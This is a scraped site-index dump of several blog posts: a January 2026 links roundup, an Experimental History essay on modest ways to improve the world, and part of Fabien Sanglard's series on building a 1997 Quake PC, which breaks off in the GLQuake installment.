<p>To approximate the conversion from Celsius to Fahrenheit, double it and add 30. For the reverse, subtract 30 and halve it. For example, if it\u2019s 12\u00baC, this heuristic would return 54\u00baF: (12 \u00d7 2) + 30 = 54. The actual amount is not far off: 53.6\u00baF. For more, see \u201cA mental math heuristic to convert between Fahrenheit and Celsius\u201d.</p> </li> <li> <p>I swear by \u201cLearn X in Y minutes\u201d, a great website that offers quick tours of programming languages. I\u2019m proud to have contributed a page on Rink, a powerful command line calculator I\u2019ve gushed about previously.</p> </li> <li> <p>Like every month, I published a few articles over at Zelda Dungeon.</p> </li> </ul>"},{"location":"evanhahn.com/Notes%20from%20January%202026_20260131/#links-and-bookmarks","title":"Links and bookmarks","text":"<ul> <li> <p>\u201cThe calendar turns, and once again a lively procession of books, images, films, and music leaves copyright behind and steps into the ever-growing public domain!\u201d I celebrated Public Domain Day by reading Agatha Christie\u2019s Murder at the Vicarage.</p> </li> <li> <p>From \u201cEverything You Need to Know About Email Encryption in 2026\u201d: \u201cYou have virtually no email privacy. They\u2019re like postcards, not envelopes.\u201d</p> </li> <li> <p>Shoutout to Minneapolis for its strike against the ICE occupation, and shoutout to General Strike US, and the National Shutdown.</p> </li> <li> <p>Speaking of ICE, they\u2019re requesting \u201cad tech\u201d data for surveillance.</p> </li> <li> <p>\u201cWhat has Meta itself observed about the harms tied to its products?\u201d Turns out, a lot.</p> </li> <li> <p>I knew about Can I use, an invaluable index of browser support for various web APIs. But this month, I learned about Can I email, a counterpart for email clients.</p> </li> <li> <p>Learned several tricks about the <code>less</code> command.</p> </li> <li> <p>A mascot for JavaScript!</p> </li> <li> <p>\u201cIn American cities, for example: though at first the automobile enabled humans to travel further distances, it now demanded that humans travel those distances, and demanded infrastructure be created &amp; maintained to enable it.\u201d From \u201cA website to destroy all websites\u201d.</p> </li> <li> <p>\u201cWho owns your data?\u201d argues that it could be useful to think of personal data as property, from a legal perspective.</p> </li> </ul> <p>Hope you had a good January.</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:41:00</p>"},{"location":"experimental-history.com/","title":"experimental-history.com","text":"<p>\u4ee5\u4e0b\u662f\u672c\u535a\u5ba2\u7684\u6240\u6709\u6587\u7ae0\uff1a</p> <ul> <li>Underrated ways to change the world, vol. II 20260203</li> </ul> <p>\u672c\u535a\u5ba2\u6587\u7ae0\u7531 OpenClaw \u81ea\u52a8\u6293\u53d6</p>"},{"location":"experimental-history.com/Underrated%20ways%20to%20change%20the%20world%2C%20vol.%20II_20260203/","title":"Underrated ways to change the world, vol. II1. ANSWER AN IMPORTANT BUT UNSEXY QUESTION2. BE A PUBLIC CHARACTER3. MAKE A SOCIAL NUCLEATION SITE4. SELL ONIONS ON THE INTERNET5. BE AN HONEST BROKER IN AN OTHERWISE SKEEVY INDUSTRY6. IMPROVE A STATISTIC7. BE A HOBBIT8. MAKE YOUR DAMN SYSTEM WORK9. BE GOOD AUDIENCE10. ACQUAINT YOURSELFDEATH STAR SUPERSTARS","text":"<p>\u6765\u6e90: experimental-history.com \u53d1\u5e03\u65f6\u95f4: Tue, 03 Feb 2026 16:28:19 GMT \u94fe\u63a5: https://www.experimental-history.com/p/underrated-ways-to-change-the-world-b64</p> <p>{'type': 'text/html', 'language': None, 'base': 'https://www.experimental-history.com/feed', 'value': 'photo cred: my dad<p>Underrated Ways to Change the World is one of my most-read posts of all time, I think because people see the state of the world and they\u2019re like, \u201cOh no, someone should do something about this!\u201d and then they\u2019re like \u201cBut what should I do about this?\u201d Every problem seems so impossibly large and complicated, where do you even start?</p><p>You start by realizing that nobody can clean up this mess single-handedly, which is fine, because we\u2019ve got roughly 16 billion other hands at the ready. All any of us have to do is find some neglected corner and start scrubbing.</p><p>That\u2019s why I take note whenever I spot someone who seems uncommonly clever at making things better, or whenever I trip over a problem that doesn\u2019t seem to have anyone fixing it. I present them to you here in the hopes that they\u2019ll inspire you as they\u2019ve inspired me.</p><p>According to this terrific profile, Donald Shoup \u201chas a strong claim on being the scholar who will have had the greatest impact on your day-to-day life\u201d. Shoup did not study cancer, nuclear physics, or AI. No, Shoup studied parking. He spent his whole career documenting the fact that \u201cfree\u201d parking ultimately backfires, and it\u2019s better to charge for parking instead and use the revenues to make neighborhoods nicer: plant trees, spruce up the parks, keep the sidewalks clean.1</p><p>Shoup\u2019s ideas have been adopted all over the world, with heartening results. When you price parking appropriately, traffic goes down, fewer people get tickets, and you know there\u2019s going to be a space waiting for you when you arrive.</p><p>Many so-called \u201cthought leaders\u201d strive for such an impact and never come close. What made Shoup so effective? Three things, says his student M. Nolan Gray:</p><ol><li><p>He picked an unsexy topic where low-hanging fruit was just waiting to be picked.</p></li><li><p>He made his ideas palatable to all sorts of politics, explaining to conservatives, libertarians, progressives, and socialists how pay-for-parking regimes fit into each of their ideologies.2</p></li><li><p>He maintained strict message discipline. When asked about the Israel-Palestine protests on campus, he reportedly responded, \u201cI\u2019m just wondering where they all parked\u201d.</p></li></ol><p>So the next time you find a convenient parking spot, thank Shoup, and the next time you want to apply your wits to improving the world, be Shoup.</p>source<p>Jane Jacobs, the great urban theorist, once wrote that the health of a neighborhood depends on its \u201cpublic characters\u201d.3 For instance, two public characters in Jacobs\u2019 neighborhood are Mr. and Mrs. Jaffe, who own a convenience store. On one winter morning, Jacobs observes the Jaffes provide the following services to the neighborhood, all free of charge:</p><ul><li><p>supervised the small children crossing at the corner on the way to [school]</p></li><li><p>lent an umbrella to one customer and a dollar to another</p></li><li><p>took custody of a watch to give the repair man across the street when he opened later</p></li><li><p>gave out information on the range of rents in the neighborhood to an apartment seeker</p></li><li><p>listened to a tale of domestic difficulty and offered reassurance</p></li><li><p>told some rowdies they could not come in unless they behaved and then defined (and got) good behavior</p></li><li><p>provided an incidental forum for half a dozen conversations among customers who dropped in for oddments</p></li><li><p>set aside certain newly arrived papers and magazines for regular customers who would depend on getting them</p></li><li><p>advised a mother who came for a birthday present not to get the ship-model kit because another child going to the same birthday party was giving that</p></li></ul><p>Some people think they can\u2019t contribute to the world because they have no unique skills. How can you help if you don\u2019t know kung fu or brain surgery? But as Jacobs writes, \u201cA public character need have no special talents or wisdom to fulfill his function\u2014although he often does. He just needs to be present [...] his main qualification is that he is public, that he talks to lots of different people.\u201d Sometimes all we need is a warm body that is willing to be extra warm.</p><p>I once did a high school science fair experiment where I put Mentos in different carbonated beverages and measured the height of the resulting geysers. The scientific value of this project was, let\u2019s say, limited, but I did learn something interesting: despite how it looks to the naked eye, bubbles don\u2019t come from nowhere. They only form at nucleation sites\u2014little pits and scratches where molecules can gather until they reach critical mass.</p>the title page of my science fair report (photo cred: my dad)<p>The same thing is true of human relationships. People are constantly crashing against each other in the great sea of humanity, but only under special conditions do they form the molecular bonds of friendship. As far as I can tell, these social nucleation sites only appear in the presence of what I would call unreasonable attentiveness.</p><p>For instance, my freshman year hallmates were uncommonly close because our resident advisor was uncommonly intense. Most other groups shuffle halfheartedly through the orientation day scavenger hunt; Kevin instructed us to show up in gym shorts and running shoes, and barked at us back and forth across campus as we attempted to locate the engineering library and the art museum. When we narrowly missed first place, he hounded the deans until they let us share in the coveted grand prize, a trip to Six Flags.</p><p>We bonded after that, not just because we had all gotten our brains rattled at the same frequency on the Superman rollercoaster, but because we could all share a knowing look with each other like, \u201cThis guy, right?\u201d Kevin\u2019s unreasonable attentiveness made our hallway A Thing. He created a furrow in the fabric of social space-time where a gaggle of 18-year-olds could glom together.</p><p>Being in the presence of unreasonable attentiveness isn\u2019t always pleasant, but then, nucleation sites are technically imperfections. Bubbles don\u2019t form in a perfectly smooth glass, and human groups don\u2019t form in perfectly smooth experiences. Unreasonable attentiveness creates the slight unevenness that helps people realize they need something to hold onto\u2014namely, each other.</p><p>Peter Askew didn\u2019t intend to become an onion merchant. He just happened to be a compulsive buyer of domain names, and when he noticed that VidaliaOnions.com was up for sale, he snagged it. He then discovered that some people love Vidalia onions. Like, really love them:</p><p>During a phone order one season \u2013 2018 I believe \u2013 a customer shared this story where he smuggled some Vidalias onto his vacation cruise ship, and during each meal, would instruct the server to \u2018take this onion to the back, chop it up, and add it onto my salad.\u2019</p><p>But these allium aficionados didn\u2019t have a good way to get in-season onions because Vidalias can only be grown in Georgia, and it\u2019s a pain for small farms to maintain a direct-to-consumer shipping business on the side. Enter Askew, who now makes a living by pleasing the Vidalia-heads:</p><p>Last season, while I called a gentleman back regarding a phone order, his wife answered. While I introduced myself, she interrupted me mid-sentence and hollered in exaltation to her husband: \u201cTHE VIDALIA MAN! THE VIDALIA MAN! PICK UP THE PHONE!\u201d</p><p>People have polarized views of business these days. Some people think we should feed grandma to the economy so it can grow bigger, while other people think we should gun down CEOs in the street. VidaliaOnions.com is, I think, a nice middle ground: you find a thing people want, you give it to them, you pocket some profit. So if you want an honest day\u2019s work, maybe figure out what else people want chopped up and put on their cruise ship salads.</p>I was going to make a joke about Vidalia onions being a subpar cruise food because they don\u2019t prevent scurvy but it turns out they actually contain a meaningful amount of vitamin C so wow maybe these things really are as great as they say (source)<p>I know a handful of people who have needed immigration lawyers, and they all say the same thing: there are no good immigration lawyers.</p><p>I think this is because the most prosocially-minded lawyers become public defenders or work at nonprofits representing cash-strapped clients, while the most capable and amoral lawyers go to white-shoe firms where they can make beaucoup bucks representing celebrity murderers and Halliburton. This leaves a doughnut hole for people who aren\u2019t indigent, but also aren\u2019t Intel. So if you want to help people, but you also don\u2019t want to make peanuts, you could do a lot of good by being an honest and competent immigration lawyer.</p><p>I think there are lots of jobs like that, roles that don\u2019t get good people because they aren\u2019t sacrificial enough to attract the do-gooders and they aren\u2019t lucrative enough to attract the overachievers. Home repair, movers, daycares, nursing homes, local news, city government\u2014these are places where honesty and talent can matter a lot, but supply is low.</p><p>So if your career offers you the choice of being a starving saint or a wealthy sinner, consider being a middle-class mensch instead. You may not be helping the absolute neediest people, and you may not be able to afford a yacht, but there are lots of folks out there who would really like some help getting their visas renewed, and they\u2019d be very happy to meet you.</p><p>Subscribe now</p><p>I have this game I like to play called Viral Statistics Bingo, where you find statistics that have gone viral on the internet and you try to trace them back to their original source. You\u2019ll usually find that they have one of five dubious origins:</p><ul><li><p>A crummy study done in like 1904</p></li><li><p>A study that was done on mice</p></li><li><p>A book that\u2019s out of print and now no one can find it</p></li><li><p>A complete misinterpretation of the data</p></li><li><p>It\u2019s just something some guy said once</p></li></ul><p>That means anyone with sufficient motivation can render a public service by improving the precision of a famous number. For example, the sex worker/data scientist  realized that no one has any idea what percentage of sex workers are victims of human trafficking. By combining her own surveys with re-analysis of publicly available data, she estimates that it\u2019s 3.2%. That number is probably not exactly right, but then, no statistic is exactly right\u2014the point is that it puts us in the right ballpark, that you can check her work for yourself, and that it\u2019s a lot better than basing our numbers on a study done in mice.</p><p>The US does a bad job regulating clinical trials, and it means we don\u2019t invent as many life-saving medicines as we could.  is trying to change that, and she says that scientists and doctors often give her damning information that would be very helpful for her reform efforts. But her sources refuse to go on the record because it might put their careers in a bit of jeopardy. Not real jeopardy, mind you, like if you drive your minivan into the dean\u2019s office or if you pants the director of the NIH. We\u2019re talking mild jeopardy, like you might be 5% less likely to win your next grant.</p><p>She refers to this as \u201chobbitian courage\u201d, as in, not the kind of courage required to meet an army of Orcs on the battlefield, but the courage required to take a piece of jewelry on a field trip to a volcano:</p><p>The quieter, hobbitian form of courage that clinical development reform (or any other hard systems problem) requires is humble: a researcher agreeing to let you cite them, an administrator willing to deviate from an inherited checklist, a policymaker ready to question a default.</p><p>It\u2019s understandable that most people don\u2019t want to risk their lives or blow up their careers to save the world. But most situations don\u2019t actually call for the ultimate sacrifice. So if you\u2019re not willing to fall on your sword, consider: would you fall on a thumbtack instead?</p>if you refuse to speak up about injustice even a little bit, you\u2019ll end up looking like this (source)<p>Every human lives part-time in a Kafka novel. In between working, eating, and sleeping, you must also navigate the terrors of various bureaucracies that can do whatever they want to you with basically no consequences.</p><p>For example, if you have the audacity to go to a hospital in the US, you will receive mysterious bills for months afterwards (\u201cYou owe us $450 because you went #2 in an out-of-network commode\u201d). If you work at a university, you have to wait weeks for an Institutional Review Board to tell you whether it\u2019s okay to ask people how much they like Pop-Tarts. The IRS knows how much you owe in taxes, but instead of telling you, you\u2019re supposed to guess, and if you guess wrong, you owe them additional money\u2014it\u2019s like playing the world\u2019s worst game show, and the host also has a monopoly on the legitimate means of violence.</p><p>If you can de-gum the gears of one of these systems\u2014even a sub-sub-sub-system!\u2014you could improve the lives of millions of people. To pick a totally random example, if you work for the Department of Finance for the City of Chicago, and somebody is like \u201cHey, this very nice blogger just moved to town and he didn\u2019t know that you have to get a sticker from us in order to have a vehicle inside city limits, let\u2019s charge him a $200 fine!\u201d, you could say in reply, \u201cWhat if we didn\u2019t do that? What if we asked him to get the sticker instead, and only fined him if he didn\u2019t follow through? Because seriously, how are people supposed to know about this sticker system? When you move to Chicago, does the ghostly form of JB Pritzker appear to you in a dream and explain that you need both a sticker from the state of Illinois, which goes on the license plate, and a sticker from the city of Chicago, which goes on your windshield? Do we serve the people, or do we terrorize them?\u201d Just as one example.</p>\u201coOoOoOo don\u2019t forget to move your car during street cleaning on the third Thursday of every month!!!\u201d (source)<p>I used to perform at a weekly standup gig when I lived in the UK, and this guy Wally would always be there in the second row. I got the impression that he didn\u2019t have anywhere else to be, but we didn\u2019t mind, because Wally was Good Audience.</p><p>When the jokes were good, he laughed loud and hard, and when the jokes were bad, he politely waited for more good jokes. Wally brought his friends, they brought their friends, and having more Good Audience made the acts better, too. (When comedians only perform for each other, no one laughs.) Eventually the gig got big, so big that it would sell out every week, and we\u2019d have to set aside a ticket for Wally or else he wouldn\u2019t get in. Ten years later, that show is still running.</p><p>Fran Leibowitz once said that the AIDS epidemic wiped out not just a generation of artists, but also a generation of audience. Great writers, performers, filmmakers, etc. cannot exist without great readers, watchers, and commentators\u2014and not just because they open their wallets and put butts in seats, but because they pluck the diamonds out of the rough, they show it to their friends and pass it on to their kids, they raise it above their heads while wading through the sea of slop, shouting, \u201cThis! Look at this!\u201d</p><p>Years ago, my friend Drew was visiting me when we noticed a whiff of natural gas in the hallway outside my apartment. I thought it was nothing\u2014my building wasn\u2019t the nicest, and it often smelled of many things\u2014but Drew, who is twice as affable and Midwestern as I am, insisted we call the gas company. A bored technician arrived and halfheartedly waved his gas-detecting wand around my neighbor\u2019s door, at which point his eyes got wide. He rushed to the basement, where he saw the gas meter spinning wildly, meaning that gas was pouring into my neighbor\u2019s apartment.</p><p>\u201cWe gotta get this door open,\u201d he said.</p><p>No one answered when we pounded on the door, so we summoned the fire department, who busted open a window and found my neighbor unconscious on the floor. His stove\u2019s burners was on, but not lit, turning his apartment into a gas chamber. They told us the guy probably would have died if someone didn\u2019t call, and the building might have caught on fire.</p><p>I was glad the guy survived, but I was ashamed that he had to be saved by a total stranger, while his own neighbor was ready to walk on by. I should have known him! I should have brought him Christmas cookies! We should have played checkers in the park on Saturdays! In the days afterward, I fantasized about knocking on his door or leaving him a note, like, \u201cHey! I notice you are elderly and alone, and I am young and nearby, maybe we should get a Tuesdays with Morrie thing going?\u201d</p><p>But I never did that. I was too intimidated. Besides, am I supposed to become bosom buddies with every schmuck who lives in my building? Who\u2019s got time for that?</p><p>Now that I\u2019ve lived among many schmucks in many different buildings, I realized that I didn\u2019t need to be this guy\u2019s best friend. I just needed to be his acquaintance. If I knew his name, if I had even spoken to him once in the hallway, then when I got a noseful of gas outside his door, I would have thought to myself, \u201cOh, Rob\u2019s apartment shouldn\u2019t smell like that.\u201d Rob \u2018n\u2019 me were never going to be Mitch and Morrie, but we could have easily been Guys Who Kind of Recognize Each Other and Would Be Willing to Report the Presence of Dangerous Chemicals on Each Other\u2019s Behalf.</p><p>A lot of well-intentioned people suffer from what we might call Superhero Syndrome: they want to save the world, but they want it to be saved by them in particular. They want to be the one who blows up the Death Star, not the one who washes the X-Wings.</p><p>This is a seductive fantasy because it disguises selfishness as sacrifice. It promises to excuse a lifetime of mediocrity with one great gesture, to pay off all your karmic debts in one fell swoop. The result is a world full of heroes-in-waiting who comfort themselves by thinking they would jump on a grenade if the situation ever presented itself, which fortunately it never does.</p><p>We do occasionally need someone to shoot torpedos into the exhaust port of a giant doomsday machine. But most of the time, we need people who sell onions, people who make sure the kids get to school safely, people who will show up to the comedy gig and laugh. I\u2019d like to live in a world full of people like that, I\u2019d be happy to pay for the sticker that lets me park there.</p><p>Experimental History would tell you about a gas leak right away, promise</p>1<p>Free parking sounds nice, so why isn\u2019t it a good idea? A few reasons: it increases housing prices through mandatory off-street parking requirements, prevents walkable neighborhoods from being built, transfers money from poorer people to richer people (everyone pays to maintain the curb, but only car owners benefit from it), wastes time (the average driver may spend something like 50 hours a year just looking for a spot), and causes congestion\u2014in dense areas, up to 1/3 of drivers are trying to find parking at any given time.</p>2<p>This is, by the way, a terrific example of what I call memetic flexibility.</p>3<p>This comes from The Death and Life of Great American Cities, p. 60-61, 68</p>'}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:40:59</p>"},{"location":"fabiensanglard.net/","title":"fabiensanglard.net","text":"<p>Chronicles of software wizardry</p> <p>\u7f51\u7ad9: https://fabiensanglard.net RSS: https://fabiensanglard.net/rss.xml</p>"},{"location":"fabiensanglard.net/#_1","title":"\u6700\u65b0\u6587\u7ae0","text":"<ul> <li>Is QSpy still cool- Let's play QuakeWorld!_20260205</li> <li>Building a 1997 Quake PC- Benchmarking GLquake_20260205</li> <li>Building a 1997 Quake PC- Benchmarking Vquake_20260205</li> <li>Building a 1997 Quake PC- Benchmarking Quake_20260205</li> <li>Building a 1997 Quake PC!_20260205</li> </ul>"},{"location":"fabiensanglard.net/Building%20a%201997%20Quake%20PC%21_20260205/","title":"Building a 1997 Quake PC!","text":"<p>\u6765\u6e90: https://fabiensanglard.net \u94fe\u63a5: https://fabiensanglard.net/quake_pc/index.html \u65e5\u671f: 08 Jan 2026 00:00:00 +0000</p> <p>FABIEN SANGLARD'S WEBSITE </p> <p>CONTACT RSS DONATE</p> <p>Jan 8, 2026</p> <p>Building a Quake PC</p> <p>After I finished restoring the IBM 2168 486 DX2-66MHz (my childhood dream DOOM PC), there was another box that I wanted to check.</p> <p>Released in June 1996, Quake received many updates to ride the triple technological shock-wave of the late 90s. Originally a DOS, software rendered, LAN oriented game, Quake transitioned to Windows with <code>winquake</code>, gained 3D hardware acceleration with <code>vquake</code>/<code>glquake</code>, and got a dedicated deathmatch fork with QuakeWorld (<code>qwcl</code>/<code>qwsv</code>).</p> <p>This is an era that I completely missed when I was a teenager because I did not have the money to upgrade my PC. On top of that, France only really got access to the Internet many years later, in 1999, when AOL came with its 99 Frcs/monthly unlimited plan.</p> <p>Here is the story of my \"Quake PC\", built thirty years later.</p> <p>Parts</p> <p>Part 1: Sourcing Parts Part 2: Turning it on Part 3: The essentials programs to run Part 4: Running DOOM &amp; Duke Nukem 3D Part 5: Benchmarking Quake  Part 6: Benchmarking VQuake Part 7: Benchmarking GLQuake Part 8: Benchmarking Quake2 and Voodoo 2 SLI Part 9: Epilogue </p> <p>Sourcing hardware parts</p> <p>When I restored the DOOM machine, I sourced parts in a slightly eccentric way. Having grown up with second hand components, I treated myself with boxes and manuals. That was expensive but so satisfactory that I did the same for this build.</p> <p> </p> <p>The European box for the 3dfx Voodoo2 is smaller. In Europe the card came with three games, while the US one came with four (photo of both boxes).</p> <p></p> <p>Picking an era</p> <p>Before starting the project, the most important decision was to settle on a time period from which I would choose the parts. I landed in 1997-1998 since the hardware would allow me to comfortably run all versions of Quake released from 1996 to 1997 and even dab into Quake II (Dec '97) territories.</p> <p>Motherboard</p> <p>The choice of the mobo was crucial since every other component would connect to it. First was the question of going AT vs ATX. Given the nightmare of cables that an AT motherboard was going to be, I was dead set on finding an ATX.</p> <p>On the CPU side, I intended to benchmark as many Pentiums as possible, possibly from 60Mhz (1993) to 223Mhz (1997). I also wanted to see with my eyes the infamous Cyrix 6x86 (1995), and AMD K6 (1997) processors perform.</p> <p>For the graphic cards , I wanted to test the VGA king Matrox Mystique (1996) but also the three milestones of the graphic hardware accelerators, Rendition Verite (1996), 3dfx Voodoo (1996), and SLI 3dfx Voodoo2 (1998). I was also curious to measure how AGP (1997) helped the software renderer vs a PCI card.</p> <p>Finally for the RAM , I wanted to be able to test EDO (1995) but also have the option to use SDRAM (1998).</p> <p>Iwill XA100 motherboard</p> <p>I lucked out with this Iwill XA100 v1.2 on ebay. Built in 1998, it seems to be stable for the technology it supports[1] and fits all my technical requirements. More importantly, the manual is readily available online[2].</p> <p>CPUs</p> <p>It turned out that a motherboard able to run Pentium from 60Mhz to 223Mhz could not exist for the good reason that all these CPUs use different sockets. </p> Socket Name Year Processor Type Fronside Bus Frequency Multiplier Frequency Socket 4 1993 P5 60MHz 1 60MHz Socket 4 1993 P5 66MHz 1 66MHz Socket 5 1994 P54C 50MHz 1.5 75MHz Socket 5 1994 P54C 60MHz 1.5 90MHz Socket 5 1994 P54C 66MHz 1.5 100MHz Socket 5 1995 P54C 60Hz 2.0 120MHz Socket 5 1995 P54C 66MHz 2.0 133MHz Socket 7 1996 P54CS 60MHz 2.5 150MHz Socket 7 1996 P54CS 66MHz 2.5 166MHz Socket 7 1996 P54CS 66MHz 3.0 200MHz Socket 7 1997 P5CC MMX 66MHz 2.5 166MHz Socket 7 1997 P5CC MMX 66MHz 3.0 200MHz Socket 7 1997 P5CC MMX 66MHz 3.5 233MHz <p>The XA100 motherboard was a good choice since its Socket 7 supports a wide range of Intel CPUs, and also Cyrix and AMD. I got a Pentium MMX 233Mhz to get the build started.</p> <p>What happened to Socket 6? It does exist but it was meant to run 486 DX4 and Pentium Overdrive CPUs. There is also a Socket 8 but these were meant for Pentium Pros.</p> <p>CPU cooling</p> <p></p> <p>It was hard to find brand new Socket 7 fans for sale. However I found a 50mm AAVID on Amazon that fit the bill. It was super easy to attach (at least compared to modern coolers). But in retrospect I should have gone on ebay right away.</p> <p>The sound coming out of the AAVID fan was unbearable. We were definitely just happy to have something up and running back then, regardless of the noise it made. I ended up purchasing a Noctua NF-A4x10 FLX which turned out whisper silent and a testimony to how much the field of PCs has improved since the late 90s.</p> <p>If you build your own machine, be careful about picking the right voltage. There is an almost identical version, the Noctua NF-A4x10 which runs on 5V instead of 12V. I felt validated to have picked a mobo with good documentation that explicitly stated the voltage of its fan connectors.</p> <p>RAM</p> <p>Since there was going to be next to no difference for game benchmarks yet provide a huge quality of life improvement, I went anachronic and purchased an obscene (for the time) amount of RAM.</p> <p>I got 3x128MB PC133 168 pin for a total of 384 MiB. A realistic consumer PC at the time would have featured 8 MiB. That is nearly 40x the amount. At $60/MiB that would have cost nearly $18,000 in 1997 ($37,865.28 in 2025).</p> <p>Graphic card</p> <p>The graphic card manufacturer choice was a no-brainer. At that time, the undisputed king of VGA was Matrox. The Canadian company had released its mythical Matrox Millenium in 1995. However, intended for professionals, the $549 price tag kept most gamers away despite its (lone) support for 3D hardware acceleration of Nascar Racing.</p> <p>The Matrox Mystique from Aug 1996 was much more consumer friendly with a 2MiB version at $149. I treated myself to a Matrox Mystique 220 4MB allowing 1280x1024 in 16-bit colors.</p> <p>Sound card</p> <p>Many motherboards in the late '90s shipped with audio chips providing Sound Blaster emulation. There was a version of the XA100 that had one but mine did not so I had to buy a sound card.</p> <p>At first, I was going to get another Sound Blaster 16 ASP, the same model I got for the 486 DOOM machine. But these did not fit the time period. I had read many good things about the Sound Blaster Live and I liked the color coded connectors on the back so I got a CT4830. I was concerned about DOS compatibility but discovered a delightful SB16 emulation setting. I ran into zero problems (except when running <code>duke3d.exe</code> and driver installation which I will discuss in the next section).</p> <p></p> <p>FDD/HDD</p> <p></p> <p>I had a FDD remaining from the 486 project so I used that. The HDD was a nightmare. I tried various kinds of IDE-SD/IDE-CF adapters. Most of them did not work. Some worked with DOS but prevented Windows 98 from creating a swap file because the media was marked as \"removable\".</p> <p>In the end, I threw money at the problem and got a Maxtor on eBay for the price of its weight in gold. It likely came from an Apple computer but it worked great.</p> <p>The IDEs HDDs had to be configured into \"slave\" or \"master\" via jumpers. This Maxtor frustrated me a great deal because the top simply said \"J50\" without showing which of the four jumpers on the back was J50.</p> <p>As I ranted against the '90s and \"how hard it was back then to have access to information\", my wife came over the workbench, looked at the HDD, and then calmly informed me the J50 was the pins on the left. Hein, mais comment tu sais ca? Then she flipped the HDD to show me the PCB pins were labeled!</p> <p>Jumper J50? Easy ! It is the one one the left she, nonchalantly, informed me.</p> <p>CD-ROM</p> <p></p> <p>I was so relieved to get into an era where motherboards came with two IDEs connectors. A simple IDE CD-ROM could be picked without having to worry about what connector the sound card supported. I found a gorgeous boxed CREATIVE BLASTER CD 48x and was very happy with it.</p> <p>The true dilemma was whether to connect the audio CD sound cable or not. I hate cables and I wanted to keep the inside of the machine as neat as possible. With Windows 98, there is an option to Enable digital CD audio for this CD-ROM device. Having the data stream go through the PCI bus instead of messing up the inside was tempting.</p> <p>In theory, according to Vogons forum, this required to install WDM drivers instead of VxD drivers[3] and would enable audio playback without the cable. However I found out that <code>winamp.exe</code> was able to do that with VxD drivers.</p> <p>The problem remaining is that most games, Quake especially, are not compatible with WDM drivers. Running them showed the CD-ROM spin but no music could be heard. In the end, I dropped my aesthetic consideration of inside beauty and connected a cable. But I used a SPDIF Cable digital since the SoundBlaster Live supported it!</p> <p></p> <p>Network card</p> <p>I had a flawless experience using a 10BaseT ISA Network Card Linksys in the 486 build so I went back to the same ebay seller and ordered again. To my delight, this time they sent me a shrink wrapped one. In retrospect I should have bought more boxes to have spare parts.</p> <p></p> <p>Of course these cards came without antenna or wireless drivers so I used the same \"trick\" as for the 486. I connected the Ethernet port to a Google Mesh Router.</p> <p>Case</p> <p>I had a hard time finding a pretty case. Despite much research I feel like the lines of the IBM 2168 spoiled me and I could not find anything as elegant. It seems it was a trend of the late '90s since even IBM refresh, the 2168 Aptiva, did not appeal to me.</p> <p>I ended up settling on a minimalist ATX MITAC case. The turquoise button was, let's say, not my favorite, but there was a nice moving sliding panel on the front to cover it all. It also came with a Power Supply Unit so I jumped on it.</p> <p> Late '90s PC cases. No amount of nostalgia can make me love them but this one was tolerable. </p> <p>The case came without any screws to mount the motherboard and drives but there are plenty of \"screw packs\" available on Amazon.</p> <p>I was also anticipating having to open the case over and over so I replaced the screws fastening the side panels with thumb screws. This way I could open it fast and without a screwdriver.</p> <p>Cables</p> <p></p> <p>Anybody who actually owned a '90s PC will tell you the inside was a mess of cables, with the main offenders being the HDD and FDD ribbon cables. There is a way nowadays to make the inside pretty by using \"round cables\". </p> <p>But vendors on eBay don't always pay attention. My Iwill XA100 motherboard uses 40-pins cable connectors so I explicitly ordered these. What ended up delivered were unfortunately 39-pin cables. Why oh why did manufacturers block that pin? Perhaps to prevent the ribbon from being connected the wrong way? But there was already a knot for that. The mystery lives on.</p> <p>After a little bit of googling I learned I could just drill it. And it worked!</p> <p>39 pins before. 40 pins after. I could have been a surgeon.</p> <p>Keyboard</p> <p></p> <p>Nothing screams QUAKE to me like the RT-9100W keyboard. Now, contrary to popular belief, all of Quake was not written with one of these. There are numerous photos of the id Software war room with no Intergraph in sight. These entered the picture when id bought RealiZm workstations running Windows NT. These keyboards \"only\" contributed to <code>winquake.exe</code>, <code>glquake.exe</code>, and quakeworld.</p> <p>I searched for a RT-9100W for a very long time. The ones I found on eBay were in disastrous condition. I ended up lucking out on FB Marketplace (I never thought I would ever buy something there) where I found one still in the box and wrapped in plastic.</p> <p></p> <p>It is not a mechanical keyboard (the connectors are membrane based) but the sound quality of the speakers was EXCEPTIONAL! I could not believe my ears. Additionally, not having to install speakers saved a lot of space on the desk. I instantly fell in love with this gem.</p> <p></p> <p>Even though the manual mentions a power brick, my model came without one. Even powered only by the PS/2 connectors, the sound is unbelievable.</p> <p>Monitor</p> <p></p> <p>I had mixed feelings about the Checkmate 1500 I used for the 486 build. The form factor was splendid but there was a post-processing of the VGA signal that made the image blurry and I did not like it.</p> <p>I tried the Dell UltraSharp 2007FPb 20\u201d LCD and the image was crisp. It is a pretty solid Windows 98/NT monitor with a native resolution of 1600X1200 pixels. I was a bit concerned about rumors that it would not run DOS games in 320x200 at 70Hz well but I never experienced any visual discomfort or \"frame skipping\". I highly recommend it.</p> <p>Oddly, I found the black casing was a nice homage to a time period where PCs started to be assembled by teenagers from diverse parts instead of being bought by parents from a major manufacturer. In the end, I liked that it did not match with the beige color of the case.</p> <p>Turning it on</p> <p>I assembled everything. I found it particularly pleasant to play contemporary music in the background while doing so (Perfect, All I Need, Ava Adore, and Novocaine for the Soul). Once I was done, I had absolutely zero hope it was going to boot, much less POST on the first try since every single component except the CPU fan was 30 years old.</p> <p></p> <p>Next</p> <p>First boot!</p> <p>References</p> ^ [1] Tomshardware review of the XA100 ^ [2] Iwill XA100 documentation ^ [3] Enabling CDROM digital playback - Where to find WDM drivers for a SB16? <p>*</p>"},{"location":"fabiensanglard.net/Building%20a%201997%20Quake%20PC-%20Benchmarking%20GLquake_20260205/","title":"Building a 1997 Quake PC: Benchmarking GLquake","text":"<p>\u6765\u6e90: https://fabiensanglard.net \u94fe\u63a5: https://fabiensanglard.net/quake_pc/glquake/index.html \u65e5\u671f: 14 Jan 2026 00:00:00 +0000</p> <p>FABIEN SANGLARD'S WEBSITE </p> <p>CONTACT RSS DONATE</p> <p>Jan 14, 2026  </p> <p>This article is part of the Quake PC series.</p> <p>Building a Quake PC: GLQuake</p> <p>To play GLQuake, I wanted to get the card labeled by John Caramak as \"The benchmark against which everything else is measured.\"[1]. I found a \"tested\" Orchid Righteous 3Dfx Voodoo on eBay for what might as well be its weight in diamonds.</p> <p></p> <p>These are the earliest consumer grade 3D accelerators. Many things give them an \"artisanal\" feel. For example, they completely take over the VGA output via a passthrough cable, there is no windowed mode support. The Orchid Righteous have mechanical relays (later revisions of the card removed them) which makes a very 